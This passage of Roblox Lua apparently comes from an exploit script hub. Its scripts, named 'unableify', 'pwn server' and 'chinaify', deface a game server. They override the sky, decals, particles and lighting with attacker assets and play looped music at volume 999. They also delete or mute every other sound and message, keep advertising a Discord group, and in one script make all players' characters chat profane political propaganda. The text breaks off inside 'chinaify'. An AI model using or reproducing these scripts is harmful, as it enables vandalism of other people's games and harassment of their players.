    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
    if not torso then return end
    
    for _, particle in ipairs(torso:GetChildren()) do
        if particle:IsA("ParticleEmitter") and particle.Texture ~= imageId then
            particle:Destroy()
        end
    end
    
    for _, velocitySpread in ipairs({0, 0, 0}) do
        local existing = false
        
        for _, particle in ipairs(torso:GetChildren()) do
            if particle:IsA("ParticleEmitter") and particle.Texture == imageId and particle.VelocitySpread == velocitySpread then
                existing = true
                break
            end
        end
        
        if not existing then
            local pe = Instance.new("ParticleEmitter")
            pe.Texture = imageId
            pe.VelocitySpread = velocitySpread
            pe.Parent = torso
        end
    end
end

task.spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                applyParticles(player.Character)
            end
        end
        task.wait(2)
    end
end)

task.spawn(function()
	local Lighting = game:GetService("Lighting")

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 1, 1),
		FogEnd = 10000000000,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}
	
	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("ColorCorrectionEffect") then
				effect:Destroy()
			end
		end
	end

	task.spawn(function()
		while true do
			for property, value in pairs(defaultValues) do
				pcall(function()
					Lighting[property] = value
				end)
			end
			restoreLightingEffects()
			task.wait(1)
		end
	end)
end)

local function applyParticlesToPart(part)
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture ~= imageId then
            child:Destroy()
        end
    end

    local alreadyHas = false
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture == imageId then
            alreadyHas = true
            break
        end
    end

    if not alreadyHas then
        local pe = Instance.new("ParticleEmitter")
        pe.Texture = imageId
        pe.VelocitySpread = 360
        pe.Rate = 10
        pe.Lifetime = NumberRange.new(5)
        pe.Speed = NumberRange.new(10)
        pe.Parent = part
        pe.SpreadAngle = Vector2.new(0, 0)
		pe.Acceleration = Vector3.new(0, 0, 0)
		
		local fe = Instance.new("ParticleEmitter")
        fe.Texture = imageId
        fe.VelocitySpread = 360
        fe.Rate = 40
        fe.Lifetime = NumberRange.new(5)
        fe.Speed = NumberRange.new(10)
        fe.Parent = part
    end
end

task.spawn(function()
    while true do
        local parts = {}
        for _, part in ipairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                table.insert(parts, part)
            end
        end

        for i = 1, #parts, batchSize do
            for j = i, math.min(i + batchSize - 1, #parts) do
                applyParticlesToPart(parts[j])
            end
            
            task.wait(1)
        end

        task.wait(1)
    end
end)

local function clearDecals(part)
	for _, child in ipairs(part:GetChildren()) do
		if child:IsA("Decal") then
			child:Destroy()
		end
	end
end

local function applyDecals(part)
	for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
		local decal = Instance.new("Decal")
		decal.Texture = imageId
		decal.Face = face
		decal.Parent = part
	end
end

task.spawn(function()
	while true do
		local allParts = {}
		for _, part in ipairs(Workspace:GetDescendants()) do
			if part:IsA("BasePart") then
				table.insert(allParts, part)
			end
		end

		local index = 1
		while index <= #allParts do
			for i = index, math.min(index + 99, #allParts) do
				local part = allParts[i]
				part.Material = Enum.Material.Plastic
				clearDecals(part)
				applyDecals(part)
			end
			index += 100
			task.wait(1)
		end
	end
end)

task.spawn(function()
	while true do
		local sound = Workspace:FindFirstChild("canttouchthissound")
		if not sound then
			sound = Instance.new("Sound")
			sound.Name = "canttouchthissound"
			sound.SoundId = musicId
			sound.Looped = true
			sound.Volume = 999
			sound.Parent = Workspace
			sound:Play()
		end
		task.wait(2)
	end
end)

local function write(text, object)
	if object:IsA("Hint") then
		local count = object:FindFirstChild("Count")
		if not count then
			count = Instance.new("NumberValue")
			count.Name = "Count"
			count.Parent = object
		end
		count.Value += 1
		local startCount = count.Value

		for i = 1, #text do
			if count.Value == startCount then
				object.Text = string.sub(text, 1, i)
				task.wait(0.06)
			else
				break
			end
		end
	end
end

task.spawn(function()
	local bro = Instance.new("Hint")
	bro.Name = "canttouchthishint"
	bro.Parent = workspace

	spawn(function()
		while true do
			local existing = workspace:FindFirstChild("canttouchthishint")
			if not existing then
				local bro = Instance.new("Hint")
				bro.Name = "canttouchthishint"
				bro.Parent = workspace
				write("join team noxious later maybe idk | gg/xZC8zJzF7u", bro)
			end
			task.wait(1)
		end
	end)

	write("join team noxious later maybe idk | gg/xZC8zJzF7u", bro)
end)

spawn(function()
	while true do
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "canttouchthishint" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "canttouchthishint" then
				message:Destroy()
			end
		end
		for _, sound in pairs(game:GetDescendants()) do
			if sound:IsA("Sound") and sound.Name ~= "canttouchthissound" then
				sound:Destroy()
			end
		end
		wait(0.5)
	end
end)

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			local function mute(container)
				for _, s in ipairs(container:GetDescendants()) do
					if s:IsA("Sound") and s.Playing then
						s.Playing = false
					end
				end
			end
			if player.Character then mute(player.Character) end
			local bp = player:FindFirstChildOfClass("Backpack")
			if bp then mute(bp) end
		end
		task.wait(2)
	end
end)
]], "CS / SS")

cscript("unableify", [[
local batchSize = 1000000
local imageId = "rbxassetid://82967466186087"
local musicId = "rbxassetid://85833437298815"

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

task.spawn(function()
	while true do
		local oldSky = Lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
		end

		local sky = Instance.new("Sky")
		sky.Name = "PersistentSky"
		sky.SkyboxBk = imageId
		sky.SkyboxDn = imageId
		sky.SkyboxFt = imageId
		sky.SkyboxLf = imageId
		sky.SkyboxRt = imageId
		sky.SkyboxUp = imageId
		sky.Parent = Lighting

		task.wait(2)
	end
end)

local function applyParticles(character)
    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
    if not torso then return end
    
    for _, particle in ipairs(torso:GetChildren()) do
        if particle:IsA("ParticleEmitter") and particle.Texture ~= imageId then
            particle:Destroy()
        end
    end
    
    for _, velocitySpread in ipairs({0, 0, 0}) do
        local existing = false
        
        for _, particle in ipairs(torso:GetChildren()) do
            if particle:IsA("ParticleEmitter") and particle.Texture == imageId and particle.VelocitySpread == velocitySpread then
                existing = true
                break
            end
        end
        
        if not existing then
            local pe = Instance.new("ParticleEmitter")
            pe.Texture = imageId
            pe.VelocitySpread = velocitySpread
            pe.Parent = torso
        end
    end
end

task.spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                applyParticles(player.Character)
            end
        end
        task.wait(2)
    end
end)

task.spawn(function()
	local Lighting = game:GetService("Lighting")

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 1, 1),
		FogEnd = 10000000000,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}
	
	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("ColorCorrectionEffect") then
				effect:Destroy()
			end
		end
	end

	task.spawn(function()
		while true do
			for property, value in pairs(defaultValues) do
				pcall(function()
					Lighting[property] = value
				end)
			end
			restoreLightingEffects()
			task.wait(1)
		end
	end)
end)

local function applyParticlesToPart(part)
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture ~= imageId then
            child:Destroy()
        end
    end

    local alreadyHas = false
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture == imageId then
            alreadyHas = true
            break
        end
    end

    if not alreadyHas then
        local pe = Instance.new("ParticleEmitter")
        pe.Texture = imageId
        pe.VelocitySpread = 360
        pe.Rate = 10
        pe.Lifetime = NumberRange.new(5)
        pe.Speed = NumberRange.new(10)
        pe.Parent = part
        pe.SpreadAngle = Vector2.new(0, 0)
		pe.Acceleration = Vector3.new(0, 0, 0)
		
		local fe = Instance.new("ParticleEmitter")
        fe.Texture = imageId
        fe.VelocitySpread = 360
        fe.Rate = 40
        fe.Lifetime = NumberRange.new(5)
        fe.Speed = NumberRange.new(10)
        fe.Parent = part
    end
end

task.spawn(function()
    while true do
        local parts = {}
        for _, part in ipairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                table.insert(parts, part)
            end
        end

        for i = 1, #parts, batchSize do
            for j = i, math.min(i + batchSize - 1, #parts) do
                applyParticlesToPart(parts[j])
            end
            
            task.wait(1)
        end

        task.wait(1)
    end
end)

local function clearDecals(part)
	for _, child in ipairs(part:GetChildren()) do
		if child:IsA("Decal") then
			child:Destroy()
		end
	end
end

local function applyDecals(part)
	for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
		local decal = Instance.new("Decal")
		decal.Texture = imageId
		decal.Face = face
		decal.Parent = part
	end
end

task.spawn(function()
	while true do
		local allParts = {}
		for _, part in ipairs(Workspace:GetDescendants()) do
			if part:IsA("BasePart") then
				table.insert(allParts, part)
			end
		end

		local index = 1
		while index <= #allParts do
			for i = index, math.min(index + 99, #allParts) do
				local part = allParts[i]
				part.Material = Enum.Material.Plastic
				clearDecals(part)
				applyDecals(part)
			end
			index += 100
			task.wait(1)
		end
	end
end)

task.spawn(function()
	while true do
		local sound = Workspace:FindFirstChild("canttouchthissound2")
		if not sound then
			sound = Instance.new("Sound")
			sound.Name = "canttouchthissound2"
			sound.SoundId = musicId
			sound.Looped = true
			sound.TimePosition = 17.5
			sound.PlaybackSpeed = 1.4
			sound.Volume = 999
			sound.Parent = Workspace
			sound:Play()
		end
		task.wait(2)
	end
end)

local function write(text, object)
	if object:IsA("Hint") then
		local count = object:FindFirstChild("Count")
		if not count then
			count = Instance.new("NumberValue")
			count.Name = "Count"
			count.Parent = object
		end
		count.Value += 1
		local startCount = count.Value

		for i = 1, #text do
			if count.Value == startCount then
				object.Text = string.sub(text, 1, i)
				task.wait(0.06)
			else
				break
			end
		end
	end
end

task.spawn(function()
	local bro = Instance.new("Hint")
	bro.Name = "canttouchthishint"
	bro.Parent = workspace

	spawn(function()
		while true do
			local existing = workspace:FindFirstChild("canttouchthishint")
			if not existing then
				local bro = Instance.new("Hint")
				bro.Name = "canttouchthishint"
				bro.Parent = workspace
				write("join team noxious later maybe idk | gg/xZC8zJzF7u", bro)
			end
			task.wait(1)
		end
	end)

	write("join team noxious later maybe idk | gg/xZC8zJzF7u", bro)
end)

spawn(function()
	while true do
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "canttouchthishint" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "canttouchthishint" then
				message:Destroy()
			end
		end
		for _, sound in pairs(game:GetDescendants()) do
			if sound:IsA("Sound") and sound.Name ~= "canttouchthissound2" then
				sound:Destroy()
			end
		end
		wait(0.5)
	end
end)

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			local function mute(container)
				for _, s in ipairs(container:GetDescendants()) do
					if s:IsA("Sound") and s.Playing then
						s.Playing = false
					end
				end
			end
			if player.Character then mute(player.Character) end
			local bp = player:FindFirstChildOfClass("Backpack")
			if bp then mute(bp) end
		end
		task.wait(2)
	end
end)
]], "CS / SS")

cscript("unableify (batch)", [[
local batchSize = 90
local imageId = "rbxassetid://82967466186087"
local musicId = "rbxassetid://85833437298815"

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

task.spawn(function()
	while true do
		local oldSky = Lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
		end

		local sky = Instance.new("Sky")
		sky.Name = "PersistentSky"
		sky.SkyboxBk = imageId
		sky.SkyboxDn = imageId
		sky.SkyboxFt = imageId
		sky.SkyboxLf = imageId
		sky.SkyboxRt = imageId
		sky.SkyboxUp = imageId
		sky.Parent = Lighting

		task.wait(2)
	end
end)

local function applyParticles(character)
    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
    if not torso then return end
    
    for _, particle in ipairs(torso:GetChildren()) do
        if particle:IsA("ParticleEmitter") and particle.Texture ~= imageId then
            particle:Destroy()
        end
    end
    
    for _, velocitySpread in ipairs({0, 0, 0}) do
        local existing = false
        
        for _, particle in ipairs(torso:GetChildren()) do
            if particle:IsA("ParticleEmitter") and particle.Texture == imageId and particle.VelocitySpread == velocitySpread then
                existing = true
                break
            end
        end
        
        if not existing then
            local pe = Instance.new("ParticleEmitter")
            pe.Texture = imageId
            pe.VelocitySpread = velocitySpread
            pe.Parent = torso
        end
    end
end

task.spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                applyParticles(player.Character)
            end
        end
        task.wait(2)
    end
end)

task.spawn(function()
	local Lighting = game:GetService("Lighting")

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 1, 1),
		FogEnd = 10000000000,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}
	
	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("ColorCorrectionEffect") then
				effect:Destroy()
			end
		end
	end

	task.spawn(function()
		while true do
			for property, value in pairs(defaultValues) do
				pcall(function()
					Lighting[property] = value
				end)
			end
			restoreLightingEffects()
			task.wait(1)
		end
	end)
end)

local function applyParticlesToPart(part)
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture ~= imageId then
            child:Destroy()
        end
    end

    local alreadyHas = false
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture == imageId then
            alreadyHas = true
            break
        end
    end

    if not alreadyHas then
        local pe = Instance.new("ParticleEmitter")
        pe.Texture = imageId
        pe.VelocitySpread = 360
        pe.Rate = 10
        pe.Lifetime = NumberRange.new(5)
        pe.Speed = NumberRange.new(10)
        pe.Parent = part
        pe.SpreadAngle = Vector2.new(0, 0)
		pe.Acceleration = Vector3.new(0, 0, 0)
		
		local fe = Instance.new("ParticleEmitter")
        fe.Texture = imageId
        fe.VelocitySpread = 360
        fe.Rate = 40
        fe.Lifetime = NumberRange.new(5)
        fe.Speed = NumberRange.new(10)
        fe.Parent = part
    end
end

task.spawn(function()
    while true do
        local parts = {}
        for _, part in ipairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                table.insert(parts, part)
            end
        end

        for i = 1, #parts, batchSize do
            for j = i, math.min(i + batchSize - 1, #parts) do
                applyParticlesToPart(parts[j])
            end
            
            task.wait(1)
        end

        task.wait(1)
    end
end)

local function clearDecals(part)
	for _, child in ipairs(part:GetChildren()) do
		if child:IsA("Decal") then
			child:Destroy()
		end
	end
end

local function applyDecals(part)
	for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
		local decal = Instance.new("Decal")
		decal.Texture = imageId
		decal.Face = face
		decal.Parent = part
	end
end

task.spawn(function()
	while true do
		local allParts = {}
		for _, part in ipairs(Workspace:GetDescendants()) do
			if part:IsA("BasePart") then
				table.insert(allParts, part)
			end
		end

		local index = 1
		while index <= #allParts do
			for i = index, math.min(index + 99, #allParts) do
				local part = allParts[i]
				part.Material = Enum.Material.Plastic
				clearDecals(part)
				applyDecals(part)
			end
			index += 100
			task.wait(1)
		end
	end
end)

task.spawn(function()
	while true do
		local sound = Workspace:FindFirstChild("canttouchthissound2")
		if not sound then
			sound = Instance.new("Sound")
			sound.Name = "canttouchthissound2"
			sound.SoundId = musicId
			sound.Looped = true
			sound.TimePosition = 17.5
			sound.PlaybackSpeed = 1.4
			sound.Volume = 999
			sound.Parent = Workspace
			sound:Play()
		end
		task.wait(2)
	end
end)

local function write(text, object)
	if object:IsA("Hint") then
		local count = object:FindFirstChild("Count")
		if not count then
			count = Instance.new("NumberValue")
			count.Name = "Count"
			count.Parent = object
		end
		count.Value += 1
		local startCount = count.Value

		for i = 1, #text do
			if count.Value == startCount then
				object.Text = string.sub(text, 1, i)
				task.wait(0.06)
			else
				break
			end
		end
	end
end

task.spawn(function()
	local bro = Instance.new("Hint")
	bro.Name = "canttouchthishint"
	bro.Parent = workspace

	spawn(function()
		while true do
			local existing = workspace:FindFirstChild("canttouchthishint")
			if not existing then
				local bro = Instance.new("Hint")
				bro.Name = "canttouchthishint"
				bro.Parent = workspace
				write("join team noxious later maybe idk | gg/xZC8zJzF7u", bro)
			end
			task.wait(1)
		end
	end)

	write("join team noxious later maybe idk | gg/xZC8zJzF7u", bro)
end)

spawn(function()
	while true do
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "canttouchthishint" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "canttouchthishint" then
				message:Destroy()
			end
		end
		for _, sound in pairs(game:GetDescendants()) do
			if sound:IsA("Sound") and sound.Name ~= "canttouchthissound2" then
				sound:Destroy()
			end
		end
		wait(0.5)
	end
end)

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			local function mute(container)
				for _, s in ipairs(container:GetDescendants()) do
					if s:IsA("Sound") and s.Playing then
						s.Playing = false
					end
				end
			end
			if player.Character then mute(player.Character) end
			local bp = player:FindFirstChildOfClass("Backpack")
			if bp then mute(bp) end
		end
		task.wait(2)
	end
end)
]], "CS / SS")

cscript("pwn server", [[
local batchSize = 1000000
local imageId = "rbxassetid://85312612489831"
local musicId = "rbxassetid://101389433601746"

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

task.spawn(function()
	while true do
		local oldSky = Lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
		end

		local sky = Instance.new("Sky")
		sky.Name = "PersistentSky"
		sky.SkyboxBk = imageId
		sky.SkyboxDn = imageId
		sky.SkyboxFt = imageId
		sky.SkyboxLf = imageId
		sky.SkyboxRt = imageId
		sky.SkyboxUp = imageId
		sky.Parent = Lighting

		task.wait(2)
	end
end)

local function applyParticles(character)
    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
    if not torso then return end
    
    for _, particle in ipairs(torso:GetChildren()) do
        if particle:IsA("ParticleEmitter") and particle.Texture ~= imageId then
            particle:Destroy()
        end
    end
    
    for _, velocitySpread in ipairs({0, 0, 0}) do
        local existing = false
        
        for _, particle in ipairs(torso:GetChildren()) do
            if particle:IsA("ParticleEmitter") and particle.Texture == imageId and particle.VelocitySpread == velocitySpread then
                existing = true
                break
            end
        end
        
        if not existing then
            local pe = Instance.new("ParticleEmitter")
            pe.Texture = imageId
            pe.VelocitySpread = velocitySpread
            pe.Parent = torso
        end
    end
end

task.spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                applyParticles(player.Character)
            end
        end
        task.wait(2)
    end
end)

task.spawn(function()
	local Lighting = game:GetService("Lighting")

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 1, 1),
		FogEnd = 10000000000,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}
	
	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("ColorCorrectionEffect") then
				effect:Destroy()
			end
		end
	end

	task.spawn(function()
		while true do
			for property, value in pairs(defaultValues) do
				pcall(function()
					Lighting[property] = value
				end)
			end
			restoreLightingEffects()
			task.wait(1)
		end
	end)
end)

local function applyParticlesToPart(part)
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture ~= imageId then
            child:Destroy()
        end
    end

    local alreadyHas = false
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture == imageId then
            alreadyHas = true
            break
        end
    end

    if not alreadyHas then
        local pe = Instance.new("ParticleEmitter")
        pe.Texture = imageId
        pe.VelocitySpread = 360
        pe.Rate = 10
        pe.Lifetime = NumberRange.new(5)
        pe.Speed = NumberRange.new(10)
        pe.Parent = part
        pe.SpreadAngle = Vector2.new(0, 0)
		pe.Acceleration = Vector3.new(0, 0, 0)
		
		local fe = Instance.new("ParticleEmitter")
        fe.Texture = imageId
        fe.VelocitySpread = 360
        fe.Rate = 40
        fe.Lifetime = NumberRange.new(5)
        fe.Speed = NumberRange.new(10)
        fe.Parent = part
    end
end

task.spawn(function()
    while true do
        local parts = {}
        for _, part in ipairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                table.insert(parts, part)
            end
        end

        for i = 1, #parts, batchSize do
            for j = i, math.min(i + batchSize - 1, #parts) do
                applyParticlesToPart(parts[j])
            end
            
            task.wait(1)
        end

        task.wait(1)
    end
end)

task.spawn(function()
	while true do
		local sound = Workspace:FindFirstChild("canttouchthissound3")
		if not sound then
			sound = Instance.new("Sound")
			sound.Name = "canttouchthissound3"
			sound.SoundId = musicId
			sound.Looped = true
			sound.Volume = 999
			sound.Parent = Workspace
			sound:Play()
		end
		task.wait(2)
	end
end)

spawn(function()
	while true do
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "canttouchthishint" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "canttouchthishint" then
				message:Destroy()
			end
		end
		for _, sound in pairs(game:GetDescendants()) do
			if sound:IsA("Sound") and sound.Name ~= "canttouchthissound3" then
				sound:Destroy()
			end
		end
		wait(0.5)
	end
end)

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			local function mute(container)
				for _, s in ipairs(container:GetDescendants()) do
					if s:IsA("Sound") and s.Playing then
						s.Playing = false
					end
				end
			end
			if player.Character then mute(player.Character) end
			local bp = player:FindFirstChildOfClass("Backpack")
			if bp then mute(bp) end
		end
		task.wait(2)
	end
end)
]], "CS / SS")

cscript("pwn server (batch)", [[
local batchSize = 90
local imageId = "rbxassetid://85312612489831"
local musicId = "rbxassetid://101389433601746"

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

task.spawn(function()
	while true do
		local oldSky = Lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
		end

		local sky = Instance.new("Sky")
		sky.Name = "PersistentSky"
		sky.SkyboxBk = imageId
		sky.SkyboxDn = imageId
		sky.SkyboxFt = imageId
		sky.SkyboxLf = imageId
		sky.SkyboxRt = imageId
		sky.SkyboxUp = imageId
		sky.Parent = Lighting

		task.wait(2)
	end
end)

local function applyParticles(character)
    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
    if not torso then return end
    
    for _, particle in ipairs(torso:GetChildren()) do
        if particle:IsA("ParticleEmitter") and particle.Texture ~= imageId then
            particle:Destroy()
        end
    end
    
    for _, velocitySpread in ipairs({0, 0, 0}) do
        local existing = false
        
        for _, particle in ipairs(torso:GetChildren()) do
            if particle:IsA("ParticleEmitter") and particle.Texture == imageId and particle.VelocitySpread == velocitySpread then
                existing = true
                break
            end
        end
        
        if not existing then
            local pe = Instance.new("ParticleEmitter")
            pe.Texture = imageId
            pe.VelocitySpread = velocitySpread
            pe.Parent = torso
        end
    end
end

task.spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                applyParticles(player.Character)
            end
        end
        task.wait(2)
    end
end)

task.spawn(function()
	local Lighting = game:GetService("Lighting")

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 1, 1),
		FogEnd = 10000000000,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}
	
	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("ColorCorrectionEffect") then
				effect:Destroy()
			end
		end
	end

	task.spawn(function()
		while true do
			for property, value in pairs(defaultValues) do
				pcall(function()
					Lighting[property] = value
				end)
			end
			restoreLightingEffects()
			task.wait(1)
		end
	end)
end)

local function applyParticlesToPart(part)
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture ~= imageId then
            child:Destroy()
        end
    end

    local alreadyHas = false
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture == imageId then
            alreadyHas = true
            break
        end
    end

    if not alreadyHas then
        local pe = Instance.new("ParticleEmitter")
        pe.Texture = imageId
        pe.VelocitySpread = 360
        pe.Rate = 10
        pe.Lifetime = NumberRange.new(5)
        pe.Speed = NumberRange.new(10)
        pe.Parent = part
        pe.SpreadAngle = Vector2.new(0, 0)
		pe.Acceleration = Vector3.new(0, 0, 0)
		
		local fe = Instance.new("ParticleEmitter")
        fe.Texture = imageId
        fe.VelocitySpread = 360
        fe.Rate = 40
        fe.Lifetime = NumberRange.new(5)
        fe.Speed = NumberRange.new(10)
        fe.Parent = part
    end
end

task.spawn(function()
    while true do
        local parts = {}
        for _, part in ipairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                table.insert(parts, part)
            end
        end

        for i = 1, #parts, batchSize do
            for j = i, math.min(i + batchSize - 1, #parts) do
                applyParticlesToPart(parts[j])
            end
            
            task.wait(1)
        end

        task.wait(1)
    end
end)

task.spawn(function()
	while true do
		local sound = Workspace:FindFirstChild("canttouchthissound3")
		if not sound then
			sound = Instance.new("Sound")
			sound.Name = "canttouchthissound3"
			sound.SoundId = musicId
			sound.Looped = true
			sound.Volume = 999
			sound.Parent = Workspace
			sound:Play()
		end
		task.wait(2)
	end
end)

spawn(function()
	while true do
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "canttouchthishint" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "canttouchthishint" then
				message:Destroy()
			end
		end
		for _, sound in pairs(game:GetDescendants()) do
			if sound:IsA("Sound") and sound.Name ~= "canttouchthissound3" then
				sound:Destroy()
			end
		end
		wait(0.5)
	end
end)

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			local function mute(container)
				for _, s in ipairs(container:GetDescendants()) do
					if s:IsA("Sound") and s.Playing then
						s.Playing = false
					end
				end
			end
			if player.Character then mute(player.Character) end
			local bp = player:FindFirstChildOfClass("Backpack")
			if bp then mute(bp) end
		end
		task.wait(2)
	end
end)
]], "CS / SS")

cscript("chinaify", [[
local ChatService = game:GetService("Chat")
local Players = game:GetService("Players")

local function bubbleTalk(text)
	for _, player in ipairs(Players:GetPlayers()) do
		if player.Character and player.Character:FindFirstChild("Head") then
			ChatService:Chat(player.Character.Head, text, Enum.ChatColor.White)
		end
	end
end

spawn(function()
	bubbleTalk("习近平万岁!!! GLORY TO THE CCP!!! 🇨🇳🇨🇳 上帝保佑你金山银山!!! 🇨🇳 向我们的光荣领袖习近平致敬!!! 操唐纳德 特朗普，操所有美国人!!! 🇨🇳🇨🇳🇨🇳")
end)

local batchSize = 1000000
local imageId = "rbxassetid://13464805869"
local musicId = "rbxassetid://134713831368801"

local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

task.spawn(function()
	while true do
		local oldSky = Lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
		end

		local sky = Instance.new("Sky")
		sky.Name = "PersistentSky"
		sky.SkyboxBk = "rbxassetid://15886770889"
		sky.SkyboxDn = "rbxassetid://15886770889"
		sky.SkyboxFt = "rbxassetid://15886770889"
		sky.SkyboxLf = "rbxassetid://15886770889"
		sky.SkyboxRt = "rbxassetid://15886770889"
		sky.SkyboxUp = "rbxassetid://15886770889"
